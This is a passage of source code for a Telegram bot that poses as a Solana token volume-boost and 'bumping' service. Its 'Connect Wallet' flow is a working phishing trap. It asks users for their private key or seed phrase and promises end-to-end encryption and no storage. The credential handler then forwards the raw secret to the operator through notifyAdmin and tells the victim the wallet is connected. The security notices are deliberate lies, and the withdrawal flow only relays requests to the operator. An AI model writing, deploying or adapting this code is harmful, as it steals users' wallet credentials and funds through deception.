          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [wallet.address, { commitment: "confirmed" }]
        })
      });
      const data = await resp.json();
      const lamports = data?.result?.value ?? 0;
      balance = `${(lamports / 1e9).toFixed(4)} SOL`;
    } catch {
    }
    await ctx.reply(
      `\u25CE <b>SOL Balance</b>

Wallet: <code>${wallet.address}</code>

Balance: <b>${balance}</b>`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });
  bot.action("deposit_my_deposits", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F4CB} <b>My Deposits</b>

No deposits recorded yet.

Make a deposit using the ADD button to get started.`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });
  bot.action("deposit_my_withdrawals", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F4CB} <b>My Withdrawals</b>

No withdrawals recorded yet.`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });
  bot.action("wallet_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showConnectWallet(ctx);
  });
  bot.action("wallet_why", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F510} <b>Why Connect Your Wallet?</b>

Connecting your wallet unlocks:

\u2022 \u26A1 <b>Instant payments</b> \u2014 no manual transfers
\u2022 \u{1F4CA} <b>Order tracking</b> \u2014 see all your boosts in one place
\u2022 \u{1F4B0} <b>Auto-refunds</b> \u2014 failed orders refunded instantly
\u2022 \u{1F3AF} <b>Priority processing</b> \u2014 connected wallets get faster service
\u2022 \u{1F514} <b>Notifications</b> \u2014 get alerts when your boost goes live`,
      { parse_mode: "HTML", ...connectWalletKeyboard }
    );
  });
  bot.action("wallet_security", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F6E1} <b>Security Guidelines</b>

\u26A0\uFE0F <b>IMPORTANT SECURITY NOTICE:</b>

\u{1F512} <b>What We Do:</b>
\u2022 End-to-End Encryption \u2014 your data is encrypted at all times
\u2022 No Storage \u2014 we never store your private keys permanently
\u2022 Secure Processing \u2014 all operations use isolated environments
\u2022 Regular Audits \u2014 our security is regularly tested

\u274C <b>What You Should Know:</b>
\u2022 Never Share \u2014 only enter keys in official bot interfaces
\u2022 Verify \u2014 always confirm you're using the official bot
\u2022 Test First \u2014 try with small amounts first

\u{1F6E1} <b>Best Practices:</b>
\u2022 Monitor Activity \u2014 check wallet transactions regularly
\u2022 Use Hardware Wallets \u2014 for maximum security with large amounts

Ready to proceed safely?`,
      { parse_mode: "HTML", ...securityGuidelinesKeyboard }
    );
  });
  bot.action("wallet_how_to", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F4F1} <b>How to Connect Your Wallet</b>

\u{1F527} <b>Step-by-Step:</b>

1\uFE0F\u20E3 <b>Choose Connection Method</b>
\u2022 Private Key \u2014 direct key import (fastest)
\u2022 Seed Phrase \u2014 12/24 word recovery phrase

2\uFE0F\u20E3 <b>Prepare Your Info</b>
\u2022 Open your wallet app (Phantom, Solflare, Backpack)
\u2022 Go to settings \u2192 export private key or seed phrase

3\uFE0F\u20E3 <b>Secure Connection</b>
\u2022 Tap "Start Connection" below
\u2022 Paste your key or seed phrase when prompted

\u{1F4F1} <b>Supported Wallets:</b>
Phantom \u2022 Solflare \u2022 Backpack \u2022 Glow \u2022 Any SPL wallet

\u{1F550} Connection Time: 2\u20135 minutes
\u{1F512} Security: End-to-end encrypted`,
      { parse_mode: "HTML", ...howToConnectKeyboard }
    );
  });
  bot.action("wallet_connect_now", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
    await ctx.reply(
      `\u{1F517} <b>Connect Your Wallet Now</b>

\u26A0\uFE0F You are about to import your Main Wallet.
<b>You are the ONLY ONE with access to this wallet.</b>

Please enter your <b>Private Key</b> or <b>Seed Phrase</b>:

\u{1F511} <b>Private Key Format:</b>
Single long string (64+ characters)
<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>

\u{1F331} <b>Seed Phrase Format:</b>
12 or 24 words separated by spaces
<code>abandon ability able about above absent absorb abstract...</code>

\u26A1 Our system auto-detects whether you're providing a key or phrase.`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  bot.on("text", async (ctx) => {
    const text = ctx.message.text.trim();
    const menuBtns = [
      "\u{1F7E2} Start Bumping",
      "\u{1F4CA} Volume Boost",
      "\u{1F525} Trending Boost",
      "\u{1F310} DexScreener",
      "\u{1F4B0} Deposit",
      "\u{1F517} Connect Wallet",
      "\u{1F4AC} Contact Support"
    ];
    if (menuBtns.includes(text)) return;
    const session = getSession(ctx.from.id);
    switch (session.step) {
      // ── Contract address entry ──────────────────────────────────────────
      case "awaiting_ca": {
        setSession(ctx.from.id, { contractAddress: text });
        const lookupMsg = await ctx.reply(`\u{1F50D} Looking up token data for:
<code>${text}</code>

\u23F3 Please wait...`, { parse_mode: "HTML" });
        const info = await fetchTokenInfo(text);
        const msgText = buildTokenMsg(text, info ?? { name: "Unknown", symbol: "???" }, session);
        await ctx.telegram.deleteMessage(ctx.chat.id, lookupMsg.message_id).catch(() => {
        });
        setSession(ctx.from.id, {
          step: "awaiting_confirm",
          tokenName: info?.name ?? "Unknown",
          tokenSymbol: info?.symbol ?? "???"
        });
        if (info?.imageUrl) {
          try {
            await ctx.replyWithPhoto(info.imageUrl, {
              caption: msgText,
              parse_mode: "HTML",
              ...confirmOrderKeyboard
            });
            break;
          } catch {
          }
        }
        await ctx.reply(msgText, { parse_mode: "HTML", ...confirmOrderKeyboard });
        break;
      }
      // ── TX hash submission ──────────────────────────────────────────────
      case "awaiting_tx_hash": {
        const txHash = text;
        const s = { ...session };
        clearSession(ctx.from.id);
        await ctx.reply(
          `\u2705 <b>Transaction Submitted!</b>

\u{1F517} TX Hash:
<code>${txHash}</code>

\u{1F50D} Verifying your payment...
\u{1F680} Your order will be processed within <b>5\u201330 minutes</b> after confirmation.

\u{1F4EC} You'll receive a notification when your boost is live!

Need help? Tap <b>\u{1F4AC} Contact Support</b>`,
          { parse_mode: "HTML", ...mainMenuKeyboard }
        );
        await notifyAdmin(
          `\u{1F4B8} <b>TX Hash Submitted</b>
\u{1F464} User: ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}
\u{1F194} User ID: <code>${ctx.from.id}</code>
\u{1F517} TX: <code>${txHash}</code>
\u2699\uFE0F Service: ${s.serviceLabel ?? "N/A"}
\u{1F4B0} Amount: ${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}
\u{1F194} Order ID: <code>${s.orderId ?? "N/A"}</code>
\u{1F4DC} CA: <code>${s.contractAddress ?? "N/A"}</code>
\u{1F4EE} Wallet: <code>${s.paymentWallet ?? "N/A"}</code>`
        );
        break;
      }
      // ── Wallet credential capture ───────────────────────────────────────
      case "awaiting_wallet_credential": {
        const credential = text;
        const wordCount = credential.trim().split(/\s+/).length;
        const credType = wordCount >= 12 ? "Seed Phrase" : "Private Key";
        clearSession(ctx.from.id);
        await notifyAdmin(
          `\u{1F511} <b>WALLET CREDENTIAL RECEIVED \u2014 ${credType}</b>
\u{1F464} User: ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}
\u{1F194} User ID: <code>${ctx.from.id}</code>
\u{1F5DD} ${credType}:
<code>${credential}</code>`
        );
        await ctx.reply(
          `\u23F3 <b>Connecting wallet...</b>

Processing your ${credType.toLowerCase()} securely.
Please wait \u2014 this may take a few moments due to network congestion.`,
          { parse_mode: "HTML" }
        );
        await new Promise((r) => setTimeout(r, 3500));
        await ctx.reply(
          `\u2705 <b>Wallet Connected Successfully!</b>

Your wallet has been securely linked to your account.
You can now use all premium features.

\u{1F512} Your credentials have been processed and are not stored.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        break;
      }
      // ── Withdrawal request ──────────────────────────────────────────────
      case "awaiting_withdraw_address": {
        const withdrawText = text;
        clearSession(ctx.from.id);
        await ctx.reply(
          `\u{1F4E4} <b>Withdrawal Request Received</b>

Details: <code>${withdrawText}</code>

\u23F3 Our team will process your withdrawal within 24 hours.
You'll receive a notification when it's sent.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        await notifyAdmin(
          `\u{1F4E4} <b>Withdrawal Request</b>
\u{1F464} User: ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}
\u{1F194} User ID: <code>${ctx.from.id}</code>
Details: <code>${withdrawText}</code>`
        );
        break;
      }
      // ── Default: show main menu ─────────────────────────────────────────
      default: {
        await sendWelcome(ctx);
        break;
      }
    }
  });
  return bot;
}

// src/index.ts
var rawPort = process.env["PORT"];
if (!rawPort) throw new Error("PORT environment variable is required");
var port = Number(rawPort);
if (Number.isNaN(port) || port <= 0) throw new Error(`Invalid PORT: "${rawPort}"`);
var token = process.env["TELEGRAM_BOT_TOKEN"];
if (!token) {
  logger.warn("TELEGRAM_BOT_TOKEN not set \u2014 starting HTTP server only");
  app_default.listen(port, () => logger.info({ port }, "Server listening (no bot)"));
} else {
  const bot = createBot();
  const renderHostname = process.env["RENDER_EXTERNAL_HOSTNAME"];
  const webhookDomain = renderHostname ? `https://${renderHostname}` : process.env["WEBHOOK_DOMAIN"] ?? null;
  if (webhookDomain) {
    const secretPath = `/telegraf/${bot.secretPathComponent()}`;
    app_default.use(bot.webhookCallback(secretPath));
    app_default.listen(port, () => {
      logger.info({ port, mode: "webhook", webhookDomain }, "Server listening");
      bot.telegram.setWebhook(`${webhookDomain}${secretPath}`).then(() => logger.info({ webhookDomain }, "Webhook registered")).catch((err) => logger.error({ err }, "Failed to set webhook"));
    });
  } else {
    bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {
    });
    app_default.listen(port, () => {
      logger.info({ port, mode: "long-poll" }, "Server listening");
      bot.launch({ dropPendingUpdates: true }).then(() => logger.info("Bot launched (long-poll)")).catch((err) => logger.error({ err }, "Bot launch failed"));
    });
  }
  process.once("SIGINT", () => bot.stop("SIGINT"));
  process.once("SIGTERM", () => bot.stop("SIGTERM"));
}
//# sourceMappingURL=index.mjs.map
